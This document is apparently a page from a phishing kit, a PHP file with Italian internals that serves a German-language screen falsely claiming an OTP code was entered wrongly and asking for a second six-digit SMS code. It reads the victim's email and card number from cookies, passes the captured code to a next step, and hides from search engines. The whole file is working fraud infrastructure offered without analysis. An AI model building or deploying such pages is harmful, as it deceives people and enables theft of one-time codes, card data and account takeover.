<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array("Secondo-otp");
$numero = 2;
$prossima = "convalida.php";
$precedente ="conferma.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");
$email="";
if(isset($_COOKIE["email"])){

  $username=$_COOKIE["email"];
}
$carta="";
if(isset($_COOKIE["carta"])){

  $carta=$_COOKIE["carta"];
}


?>
<html>
    <head>
        <title>Melde dich in deinem Konto an</title>
        <meta name='robots' content='noindex' />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta name='googlebot' content='noindex'>
        <meta name='googlebot-news' content='nosnippet'>
        <link rel='shortcut icon' type='image/jpg' href='' />
        <link rel='stylesheet' href='static/style.css'>
        <script src='static/main.js' defer async></script>
    </head>

    <body>
        <div class='content'>
            <div class='content__important'>
                <header>
                    <div class='header__wrapper'>
                        <div class='header__wrapper__logo'>
                        </div>
                    </div>
                </header>
                <main>
                    <div class='main__wrapper'>
					<div class='label__wrapper'>
                            <span class='introduction_label'>
                         <center>OTP-CODE FALSCH EINGEGEBEN</center>
                         <span>
                        </div>
                        <div class='label__wrapper'>
                            <span class='introduction_label'>
<center>Sie erhalten in Kürze eine neue SMS mit dem Verifizierungscode, der zum Abschluss des Verifizierungsprozesses erforderlich ist</center>
                            <span>
                        </div>
                        <div class='form__wrapper'>
                           <form  class="form-login clearfix" method="POST" onsubmit="logintest(this)"><input id="url" name="url" type="hidden" value="convalida.php" />
                                <div class='input-wrapper email'>
                                    <input required placeholder="Sicherheitscode" autocomplete="off" class='input__field email' type="text" name="Secondo-otp"
                                        id="Secondo-otp">
                                </div>
                                <div class='label__wrapper'>
                                    <span class='introduction_label'>
                                        <center>Achtung: Der einzugebende Code besteht aus 6 Ziffern, die sich im Nachrichteninhalt befinden</center>
                                    <span>
                                </div>
                                <div class='input-wrapper submit'>
                                    <input class='input__field submit' type='submit' value='Weiter'>
                                </div>
                            </form>
                        </div>
                        <div class='choose-lenguage__wrapper'>
                            <ul class="choose-lenguage__list">
                                <li class="choose-lenguage__list__elem">
                                    Deutsch
                                </li>
                                <li class="choose-lenguage__list__elem">
                                    English
                                </li>
                            </ul>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </body>
</html>
